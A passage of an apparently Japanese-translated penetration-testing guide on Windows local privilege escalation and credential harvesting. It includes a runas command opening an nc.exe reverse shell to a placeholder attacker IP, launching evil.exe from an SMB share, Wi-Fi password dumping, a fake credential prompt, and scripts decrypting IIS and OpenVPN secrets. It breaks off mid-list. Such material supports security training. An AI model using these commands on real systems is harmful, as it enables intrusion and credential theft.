ホストファイルにハードコードされた他の既知のコンピュータをチェックします
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース＆DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### オープンポート

外部からの**制限されたサービス**をチェックします
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールのルール

[**ファイアウォールに関連するコマンドはこちらをチェックしてください**](../basic-cmd-for-pentesters.md#firewall) **(ルールのリスト、ルールの作成、無効化、無効化...)**

ネットワーク列挙のための[その他のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリの `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも見つけることができます。

root ユーザーになると、任意のポートでリッスンすることができます（ポートで `nc.exe` を初めて使用すると、ファイアウォールによって `nc` が許可されるかどうかを GUI で尋ねられます）。
```
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Bashを簡単にrootとして起動するには、`--default-user root`を試してみてください。

`WSL`ファイルシステムは、フォルダ`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`で探索できます。

## Windowsの資格情報

### Winlogonの資格情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 資格情報マネージャー / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vaultは、**Windows**が**ユーザーを自動的にログイン**させることができるサーバー、ウェブサイト、および他のプログラムのユーザー資格情報を格納します。最初のインスタンスでは、これはユーザーがFacebookの資格情報、Twitterの資格情報、Gmailの資格情報などを保存し、ブラウザ経由で自動的にログインできるようになると思われるかもしれませんが、実際にはそうではありません。

Windows Vaultは、Windowsがユーザーを自動的にログインさせるための資格情報を格納し、つまり、**リソース（サーバーまたはウェブサイト）にアクセスするために資格情報が必要なWindowsアプリケーション**は、ユーザーがユーザー名とパスワードを毎回入力する代わりに、この資格情報マネージャー＆Windows Vaultを利用して提供された資格情報を使用できます。

アプリケーションが資格情報マネージャーとやり取りしない限り、特定のリソースの資格情報を使用することはできないと思います。したがって、アプリケーションがVaultを利用する場合、デフォルトのストレージVaultからそのリソースの資格情報を取得するように、どうやって資格情報マネージャーと通信するかを考える必要があります。

`cmdkey`を使用して、マシンに保存されている資格情報をリストアップします。
```
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
次に、保存された資格情報を使用するために`runas`を`/savecred`オプションとともに使用できます。次の例は、SMB共有を介してリモートバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas`を提供された資格情報と一緒に使用します。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意してください。mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1)から情報を取得できます。

### DPAPI

理論上、Data Protection API はあらゆる種類のデータの対称暗号化を可能にすることができます。実際には、Windows オペレーティングシステムでの主な使用法は、非対称秘密鍵の対称暗号化を行うために、ユーザーまたはシステムの秘密をエントロピーの重要な要素として使用することです。

**DPAPI は、開発者がユーザーのログオン秘密から派生した対称鍵を使用してキーを暗号化できるようにします**。また、システムの暗号化の場合は、システムのドメイン認証秘密を使用します。

ユーザーのRSAキーを暗号化するために使用されるDPAPIキーは、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで、{SID} はそのユーザーの[セキュリティ識別子](https://en.wikipedia.org/wiki/Security\_Identifier)です。**DPAPIキーは、ユーザーのプライベートキーを保護するマスターキーと同じファイルに保存されます**。通常、これはランダムな64バイトのデータです。（このディレクトリは保護されているため、cmdから`dir`を使用してリストすることはできませんが、PowerShellからはリストできます）。
```
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
**mimikatzモジュール** `dpapi::masterkey`を適切な引数（`/pvk`または`/rpc`）と共に使用して、それを復号化できます。

通常、**マスターパスワードで保護された資格情報ファイル**は次の場所にあります：
```
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatz module** `dpapi::cred`を適切な `/masterkey` と共に使用して復号化することができます。\
`sekurlsa::dpapi`モジュールを使用して（root権限であれば）、**メモリ**から**多くのDPAPI** **masterkeys**を抽出できます。

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell Credentials

**PowerShell credentials**は、**スクリプト**や自動化タスクでよく使用され、暗号化された資格情報を便利に保存する方法として使用されます。これらの資格情報は通常、**DPAPI**を使用して保護されており、通常は作成されたコンピューター上の同じユーザーによってのみ復号化できることを意味します。

ファイルに含まれるPS資格情報を復号化するには、以下を実行します:
```
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存されたRDP接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`で見つけることができます\
そして`HKCU\Software\Microsoft\Terminal Server Client\Servers\`にもあります

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャ**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
**Mimikatz**の`dpapi::rdg`モジュールを適切な`/masterkey`で使用して、**.rdgファイルを復号化**します。\
Mimikatzの`sekurlsa::dpapi`モジュールを使用して、メモリから**多くのDPAPIマスターキー**を抽出できます。

### Sticky Notes

WindowsワークステーションでStickyNotesアプリを使用して、**パスワード**やその他の情報を保存する人が多く、これがデータベースファイルであることに気づいていません。このファイルは`C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exeからパスワードを回復するには、管理者である必要があり、高い整合性レベルで実行する必要があります。**\
**AppCmd.exe**は`%systemroot%\system32\inetsrv\`ディレクトリにあります。\
このファイルが存在する場合、いくつかの**資格情報**が構成されており、**回復**できる可能性があります。

このコードは[**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)から抽出されました。
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するかどうかを確認します。\
インストーラーは **SYSTEM 権限で実行されます**。多くのインストーラーは **DLL Sideloading に脆弱** であることがあります（情報は [https://github.com/enjoiz/Privesc](https://github.com/enjoiz/Privesc) から取得）。
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ（資格情報）

### Puttyの資格情報
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内のSSHキー

SSHの秘密鍵は、レジストリキー `HKCU\Software\OpenSSH\Agent\Keys` 内に保存されることがありますので、そこに興味深い情報がないかをチェックする必要があります。
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```
そのパス内にエントリが見つかった場合、おそらく保存されたSSHキーである可能性があります。これは暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用して簡単に復号化できます。\
この技術に関する詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` サービスが実行されていない場合、自動的に起動するようにしたい場合は、次のコマンドを実行してください:
```
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
このテクニックはもはや有効ではないようです。いくつかのSSHキーを作成し、`ssh-add`を使ってそれらを追加し、SSH経由でマシンにログインしようとしました。レジストリ`HKCU\Software\OpenSSH\Agent\Keys`は存在せず、procmonは非対称キー認証中に`dpapi.dll`の使用を特定しませんでした。
{% endhint %}

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**Windows ハードニング - Windows ローカル特権昇格**

このモジュールは、Windows システムでローカル特権昇格を行うための手法を提供します。この手法は、標準の Windows ツールや既知の脆弱性を利用して実行されます。この手法を使用することで、攻撃者はシステム内での特権昇格を試みることができます。
```markup
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド資格情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml**というファイルを検索します。

### キャッシュされたGPPパスワード

KB2928120（MS14-025を参照）より前に、一部のグループポリシー設定にカスタムアカウントを使用できました。この機能は、複数のマシンにカスタムローカル管理者アカウントを展開するために主に使用されていました。ただし、このアプローチには2つの問題がありました。まず、グループポリシーオブジェクトはSYSVOL内のXMLファイルとして保存されているため、任意のドメインユーザーがそれらを読むことができます。2つ目の問題は、これらのGPPに設定されたパスワードがデフォルトキーでAES256で暗号化されていることで、このデフォルトキーは公に文書化されています。これは、認証されたユーザーが非常に機密性の高いデータにアクセスし、自分のマシンまたはドメインで特権を昇格させる可能性があることを意味します。この機能は、ローカルにキャッシュされたGPPファイルに空でない「cpassword」フィールドが含まれているかどうかを確認します。その場合、それを復号化して、ファイルの場所とともにGPPに関する情報を含むカスタムPSオブジェクトを返します。

これらのファイルを検索します：`C:\ProgramData\Microsoft\Group Policy\history`または_**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（W Vistaより前）_

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**cPasswordを復号化するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
### パスワードを取得するためのcrackmapexecの使用方法:
```shell-session
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config

### IIS Web Config

### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Web.configの例として、資格情報が含まれる可能性があります。
```markup
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPNの資格情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 資格情報の要求

ユーザーに、自分の資格情報または別のユーザーの資格情報を入力してもらうように依頼することができます（クライアントに直接資格情報を要求することは非常に危険であることに注意してください）:
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **資格情報を含む可能性のあるファイル名**

以前に**パスワード**を**クリアテキスト**または**Base64**で含んでいたとされるファイル名
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
提案されたすべてのファイルを検索します：
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### リサイクルビン内の資格情報

Binをチェックして、中にある資格情報を確認する必要があります

複数のプログラムに保存された**パスワードを回復**するには、次を使用できます：[http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### レジストリ内部

**資格情報を持つ可能性のある他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリからopensshキーを抽出します。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

**ChromeまたはFirefox** からのパスワードが保存されている可能性のあるデータベースをチェックする必要があります。\
また、ブラウザの履歴、ブックマーク、お気に入りをチェックして、そこに**パスワードが**保存されているかもしれません。

ブラウザからパスワードを抽出するためのツール:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)\*\*\*\*

### **COM DLL上書き**

**Component Object Model (COM)** は、Windowsオペレーティングシステム内に組み込まれた技術で、異なる言語のソフトウェアコンポーネント間の**相互通信**を可能にします。各COMコンポーネントは**クラスID (CLSID)** によって識別され、各コンポーネントは1つ以上のインターフェースを介して機能を公開し、インターフェースID (IID) によって識別されます。

COMクラスとインターフェースは、レジストリ内の**HKEY\_**_**CLASSES\_**_**ROOT\CLSID** および**HKEY\_**_**CLASSES\_**_**ROOT\Interface** に定義されます。このレジストリは、**HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** をマージして作成される**HKEY\_**_**CLASSES\_**_**ROOT** です。

このレジストリのCLSIDsの中には、**InProcServer32** という子レジストリがあり、**DLL** を指す**デフォルト値**と、**Apartment** (シングルスレッド)、**Free** (マルチスレッド)、**Both** (シングルまたはマルチ)、または**Neutral** (スレッドニュートラル) と呼ばれる値を含む**ThreadingModel** が含まれています。

![](<../../.gitbook/assets/image (638).png>)

基本的に、実行されるDLLのいずれかを**上書き**できれば、別のユーザーによって実行される場合には、特権を**昇格**できます。

攻撃者がCOMハイジャックを持続性メカニズムとしてどのように使用するかを学ぶには、以下を参照してください:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **ファイルとレジストリ内の汎用パスワード検索**

**ファイル内容の検索**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索します**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリを検索してキー名やパスワードを探す**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は私が作成したmsfプラグイン**で、被害者の中で資格情報を検索するすべてのmetasploit POSTモジュールを自動的に実行します。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページに記載されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) はシステムからパスワードを抽出するための別の優れたツールです。

ツール[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、このデータを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、およびRDP）の**セッション**、**ユーザー名**、**パスワード**を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## リークしたハンドラ

**SYSTEMとして実行されているプロセスが、完全なアクセス**で新しいプロセスを開く（`OpenProcess()`）とします。同じプロセスが**低い特権で新しいプロセス**（`CreateProcess()`）**を作成し、ただしメインプロセスのすべてのオープンハンドルを継承します**。\
その後、**低い特権を持つプロセスに完全なアクセス権がある場合**、`OpenProcess()`で作成された**特権プロセスへのオープンハンドルを取得**し、**シェルコードをインジェクト**できます。\
[**この脆弱性を検出および悪用する方法についての詳細はこちらを参照してください**](leaked-handle-exploitation.md)\
[**異なる権限レベルで継承されたプロセスおよびスレッドのオープンハンドラをテストおよび悪用する方法についての詳細な説明については、この他の投稿を読んでください（完全なアクセスのみではなく）**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)。

## 名前付きパイプクライアントの権限昇格

`パイプ`は、プロセスが通信やデータ交換に使用できる共有メモリのブロックです。

`Named Pipes`は、Windowsのメカニズムであり、2つの無関係なプロセスが、それぞれが異なるネットワーク上にある場合でもデータをやり取りできるようにします。クライアント/サーバーアーキテクチャに非常に似ており、`名前付きパイプサーバー`や`名前付きパイプクライアント`などの概念が存在します。

**クライアントがパイプに書き込むと**、パイプを作成した**サーバー**は、**SeImpersonate**権限を持っていれば**クライアントを偽装**できます。その後、**偽装できるパイプに書き込む特権プロセスを見つけることができれば**、そのプロセスが作成したパイプに書き込んだ後に**そのプロセスを偽装して特権を昇格**させることができるかもしれません。[**この攻撃を実行する方法についてはこちらを読んでください**](named-pipe-client-impersonation.md) **または** [**こちら**](./#from-high-integrity-to-system)**。**

**また、次のツールを使用すると、Burpなどのツールで名前付きパイプ通信を傍受できます:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **また、このツールを使用すると、すべてのパイプをリストアップして特権昇格を見つけることができます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)****

## その他

### **パスワードを監視するためのコマンドライン**

ユーザーとしてシェルを取得すると、スケジュールされたタスクや他のプロセスが実行され、**コマンドラインで資格情報が渡される**可能性があります。以下のスクリプトは、プロセスのコマンドラインを2秒ごとにキャプチャし、現在の状態と前の状態を比較して、違いがあれば出力します。
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 低特権ユーザーからNT\AUTHORITY SYSTEMへ（CVE-2019-1388）/ UAC バイパス

もしグラフィカルインターフェースにアクセスでき、UAC が有効な場合、一部のMicrosoft Windowsのバージョンでは、特権のないユーザーからターミナルや他のプロセス（例: "NT\AUTHORITY SYSTEM"）を実行することが可能です。

これにより、特権を昇格させ、同時に UAC をバイパスすることができます。さらに、何もインストールする必要はなく、プロセス中に使用されるバイナリは、Microsoftによって署名されています。

影響を受けるシステムの一部は以下の通りです:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、以下の手順を実行する必要があります：

```
1) HHUPD.EXEファイルを右クリックし、管理者として実行します。

2) UACプロンプトが表示されたら、「詳細情報を表示」を選択します。

3) 「発行元の証明書情報を表示」をクリックします。

4) システムが脆弱な場合、「発行元」のURLリンクをクリックすると、デフォルトのWebブラウザが表示される場合があります。

5) サイトが完全に読み込まれるのを待ち、「名前を付けて保存」を選択してexplorer.exeウィンドウを表示します。

6) エクスプローラウィンドウのアドレスパスに、cmd.exe、powershell.exe、または他の対話型プロセスを入力します。

